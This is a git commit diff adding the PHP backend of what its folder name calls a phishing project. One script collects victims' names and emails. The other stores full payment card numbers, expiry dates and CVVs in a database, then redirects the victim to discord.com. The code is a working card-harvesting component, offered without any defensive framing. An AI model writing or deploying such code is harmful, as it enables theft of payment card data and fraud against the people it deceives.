a55c8c8a919f1857bade4969b0edb9556a13cefb
Nicolaescu Ovidiu-Constantin <86914229+MindOfBear@users.noreply.github.com>
2023-05-10 23:24:17 +0300

    Upload initial
    Interfata + functionalitate adaugare date in baza de date

---
+++ Proiect-Phishing/efectuare-tranzactie.php
@@ -0,0 +1,17 @@
+<?php
+require_once("connect.php");
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $cardnumber = $_POST['input-card'];
+    $numePosesor = $_POST['nume'];
+    $expirareCard = $_POST['expirareCard'];
+    $expirareCard = $expirareCard . "-01";
+    $cvv = $_POST['cvv'];
+
+    $stmt = $connect->prepare("INSERT INTO cards (numeCard, numarCard, expirareCard, cvvCard) VALUES (?, ?, ?, ?)");
+    $stmt->bind_param("sssi", $numePosesor, $cardnumber, $expirareCard, $cvv);
+    $stmt->execute();
+    header('Location: http://discord.com');
+}
+
+?>
+
---
+++ Proiect-Phishing/eligibil.php
@@ -0,0 +1,14 @@
+<?php
+require_once("connect.php");
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $nume = $_POST['nume'];
+    $email = $_POST['email'];
+
+    $stmt = $connect->prepare("INSERT INTO user (nume, email) VALUES (?, ?)");
+    $stmt->bind_param("ss", $nume, $email);
+    $stmt->execute();
+    header('Location: eligibil-payment.php');
+}
+
+?>
+
